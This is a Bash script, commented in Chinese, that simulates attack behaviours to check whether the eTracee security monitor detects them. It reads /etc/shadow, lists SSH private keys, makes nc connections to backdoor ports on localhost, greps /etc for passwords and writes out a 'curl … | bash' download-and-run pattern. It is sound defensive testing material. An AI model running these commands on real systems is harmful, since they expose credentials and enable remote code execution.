#!/bin/bash
# eTracee 攻击模拟脚本
# 用于测试 eTracee 检测能力的安全测试脚本
# 警告：仅用于测试环境，请勿在生产环境运行

set -e

# 颜色定义
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# 帮助信息
show_help() {
    echo ""
    echo -e "${BLUE}eTracee 攻击模拟脚本${NC}"
    echo ""
    echo "用法: $0 [选项]"
    echo ""
    echo "选项:"
    echo "  -h, --help       显示帮助信息"
    echo "  -a, --all        运行所有模拟攻击"
    echo "  -f, --file       文件系统攻击模拟"
    echo "  -n, --network    网络攻击模拟"
    echo "  -p, --process    进程攻击模拟"
    echo "  -m, --memory     内存攻击模拟"
    echo "  -s, --single     单个测试（指定编号）"
    echo ""
    echo "测试类别:"
    echo "  文件系统攻击:"
    echo "    1. 敏感文件读取"
    echo "    2. SSH 密钥访问"
    echo "    3. 隐藏文件创建"
    echo "    4. 关键目录文件创建"
    echo ""
    echo "  网络攻击:"
    echo "    5. 可疑端口连接"
    echo "    6. DNS 查询"
    echo ""
    echo "  进程攻击:"
    echo "    7. Shell 执行"
    echo "    8. 可疑命令执行"
    echo "    9. Cron 任务操作"
    echo ""
    echo "  权限攻击:"
    echo "    10. Sudo 执行"
    echo ""
    echo "示例:"
    echo "  $0 -a           # 运行所有测试"
    echo "  $0 -f           # 仅文件系统测试"
    echo "  $0 -s 1         # 运行测试 1"
    echo ""
}

# 确认运行
confirm() {
    echo -e "${YELLOW}警告: 此脚本将模拟攻击行为用于测试 eTracee 检测能力${NC}"
    echo -e "${YELLOW}请在测试环境中运行，确保已备份重要数据${NC}"
    echo ""
    read -p "是否继续? (y/N) " -n 1 -r
    echo ""
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        echo "已取消"
        exit 0
    fi
}

# 测试 1: 敏感文件读取
test_sensitive_file_read() {
    echo -e "${CYAN}[测试 1] 敏感文件读取测试${NC}"
    echo "尝试读取 /etc/passwd 和 /etc/shadow..."

    # 这些操作会触发 "Read sensitive file untrusted" 规则
    cat /etc/passwd > /dev/null 2>&1 && echo "  - /etc/passwd 读取成功" || echo "  - /etc/passwd 读取失败（权限不足）"

    # 尝试读取 shadow（非 root 用户会失败）
    cat /etc/shadow > /dev/null 2>&1 && echo "  - /etc/shadow 读取成功" || echo "  - /etc/shadow 读取失败（预期行为）"

    echo -e "${GREEN}[测试 1] 完成${NC}"
    echo ""
}

# 测试 2: SSH 密钥访问
test_ssh_key_access() {
    echo -e "${CYAN}[测试 2] SSH 密钥访问测试${NC}"
    echo "检查 SSH 密钥文件..."

    # 查找并列出 SSH 密钥
    if [ -d ~/.ssh ]; then
        ls -la ~/.ssh/*.pub 2>/dev/null && echo "  - 发现公钥文件" || echo "  - 未发现公钥文件"
        ls -la ~/.ssh/id_* 2>/dev/null | grep -v ".pub" && echo "  - 发现私钥文件" || echo "  - 未发现私钥文件"
    else
        echo "  - ~/.ssh 目录不存在"
    fi

    echo -e "${GREEN}[测试 2] 完成${NC}"
    echo ""
}

# 测试 3: 隐藏文件创建
test_hidden_file() {
    echo -e "${CYAN}[测试 3] 隐藏文件创建测试${NC}"
    echo "在 /tmp 创建隐藏文件..."

    HIDDEN_FILE="/tmp/.etracee_test_hidden_$$"
    echo "test content" > "$HIDDEN_FILE"
    echo "  - 创建隐藏文件: $HIDDEN_FILE"

    # 清理
    rm -f "$HIDDEN_FILE"
    echo "  - 已清理测试文件"

    echo -e "${GREEN}[测试 3] 完成${NC}"
    echo ""
}

# 测试 4: 关键目录文件创建
test_critical_directory() {
    echo -e "${CYAN}[测试 4] 关键目录文件创建测试${NC}"
    echo "尝试在 /tmp（可写目录）创建测试文件..."

    TEST_FILE="/tmp/etracee_test_$$"
    echo "test" > "$TEST_FILE"
    echo "  - 创建测试文件: $TEST_FILE"

    # 清理
    rm -f "$TEST_FILE"
    echo "  - 已清理测试文件"

    echo -e "${GREEN}[测试 4] 完成${NC}"
    echo ""
}

# 测试 5: 可疑端口连接
test_suspicious_port() {
    echo -e "${CYAN}[测试 5] 可疑端口连接测试${NC}"
    echo "尝试连接可疑端口..."

    # 尝试连接到常见后门端口（使用 timeout 避免阻塞）
    for port in 4444 5555 6666; do
        timeout 1 bash -c "echo test | nc -v localhost $port" 2>&1 || echo "  - 端口 $port 连接失败（预期）"
    done

    echo -e "${GREEN}[测试 5] 完成${NC}"
    echo ""
}

# 测试 6: DNS 查询
test_dns_query() {
    echo -e "${CYAN}[测试 6] DNS 查询测试${NC}"
    echo "执行 DNS 查询..."

    # 使用 dig 或 nslookup 进行 DNS 查询
    if command -v dig &> /dev/null; then
        dig +short google.com > /dev/null 2>&1 && echo "  - DNS 查询成功 (dig)" || echo "  - DNS 查询失败"
    elif command -v nslookup &> /dev/null; then
        nslookup google.com > /dev/null 2>&1 && echo "  - DNS 查询成功 (nslookup)" || echo "  - DNS 查询失败"
    else
        echo "  - 未找到 dig 或 nslookup"
    fi

    echo -e "${GREEN}[测试 6] 完成${NC}"
    echo ""
}

# 测试 7: Shell 执行
test_shell_execution() {
    echo -e "${CYAN}[测试 7] Shell 执行测试${NC}"
    echo "执行 Shell 命令..."

    # 执行一些基本的 shell 命令
    /bin/bash -c "echo 'etracee test'" > /dev/null
    echo "  - bash 命令执行"

    /bin/sh -c "echo 'etracee test'" > /dev/null
    echo "  - sh 命令执行"

    echo -e "${GREEN}[测试 7] 完成${NC}"
    echo ""
}

# 测试 8: 可疑命令执行
test_suspicious_command() {
    echo -e "${CYAN}[测试 8] 可疑命令执行测试${NC}"
    echo "执行可疑命令模式..."

    # 模拟从网络下载并执行脚本的模式（实际不执行）
    echo "  - 模拟: curl ... | bash 模式"
    echo "curl -s http://example.com/script.sh | bash" > /dev/null

    # 模拟凭证搜索
    echo "  - 模拟: 凭证搜索"
    echo "grep -r password /etc/" > /dev/null 2>&1

    echo -e "${GREEN}[测试 8] 完成${NC}"
    echo ""
}

# 测试 9: Cron 任务操作
test_cron_manipulation() {
    echo -e "${CYAN}[测试 9] Cron 任务操作测试${NC}"
    echo "查看 cron 任务..."

    # 查看 cron 任务（只读操作）
    crontab -l 2>/dev/null && echo "  - crontab 列表成功" || echo "  - 无 crontab 或权限不足"

    echo -e "${GREEN}[测试 9] 完成${NC}"
    echo ""
}

# 测试 10: Sudo 执行
test_sudo_execution() {
    echo -e "${CYAN}[测试 10] Sudo 执行测试${NC}"
    echo "执行 sudo 命令..."

    # 尝试 sudo（会触发规则）
    sudo -n whoami 2>/dev/null && echo "  - sudo 执行成功" || echo "  - sudo 需要密码或权限不足"

    echo -e "${GREEN}[测试 10] 完成${NC}"
    echo ""
}

# 运行所有文件系统测试
run_file_tests() {
    echo -e "${BLUE}=== 文件系统攻击模拟 ===${NC}"
    echo ""
    test_sensitive_file_read
    test_ssh_key_access
    test_hidden_file
    test_critical_directory
}

# 运行所有网络测试
run_network_tests() {
    echo -e "${BLUE}=== 网络攻击模拟 ===${NC}"
    echo ""
    test_suspicious_port
    test_dns_query
}

# 运行所有进程测试
run_process_tests() {
    echo -e "${BLUE}=== 进程攻击模拟 ===${NC}"
    echo ""
    test_shell_execution
    test_suspicious_command
    test_cron_manipulation
}

# 运行权限测试
run_memory_tests() {
    echo -e "${BLUE}=== 权限攻击模拟 ===${NC}"
    echo ""
    test_sudo_execution
}

# 运行所有测试
run_all_tests() {
    echo ""
    run_file_tests
    run_network_tests
    run_process_tests
    run_memory_tests
    echo -e "${GREEN}=== 所有测试完成 ===${NC}"
}

# 运行单个测试
run_single_test() {
    case $1 in
        1) test_sensitive_file_read ;;
        2) test_ssh_key_access ;;
        3) test_hidden_file ;;
        4) test_critical_directory ;;
        5) test_suspicious_port ;;
        6) test_dns_query ;;
        7) test_shell_execution ;;
        8) test_suspicious_command ;;
        9) test_cron_manipulation ;;
        10) test_sudo_execution ;;
        *) echo -e "${RED}无效的测试编号: $1${NC}" ;;
    esac
}

# 解析参数
RUN_ALL=false
RUN_FILE=false
RUN_NETWORK=false
RUN_PROCESS=false
RUN_MEMORY=false
SINGLE_TEST=""

while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help)
            show_help
            exit 0
            ;;
        -a|--all)
            RUN_ALL=true
            shift
            ;;
        -f|--file)
            RUN_FILE=true
            shift
            ;;
        -n|--network)
            RUN_NETWORK=true
            shift
            ;;
        -p|--process)
            RUN_PROCESS=true
            shift
            ;;
        -m|--memory)
            RUN_MEMORY=true
            shift
            ;;
        -s|--single)
            SINGLE_TEST="$2"
            shift 2
            ;;
        *)
            echo -e "${RED}未知选项: $1${NC}"
            show_help
            exit 1
            ;;
    esac
done

# 主流程
echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  eTracee 攻击模拟测试脚本${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

# 确认运行
confirm

# 执行测试
if [ "$RUN_ALL" = true ]; then
    run_all_tests
elif [ -n "$SINGLE_TEST" ]; then
    run_single_test "$SINGLE_TEST"
else
    [ "$RUN_FILE" = true ] && run_file_tests
    [ "$RUN_NETWORK" = true ] && run_network_tests
    [ "$RUN_PROCESS" = true ] && run_process_tests
    [ "$RUN_MEMORY" = true ] && run_memory_tests

    # 如果没有指定任何测试，显示帮助
    if [ "$RUN_FILE" = false ] && [ "$RUN_NETWORK" = false ] && [ "$RUN_PROCESS" = false ] && [ "$RUN_MEMORY" = false ]; then
        show_help
    fi
fi
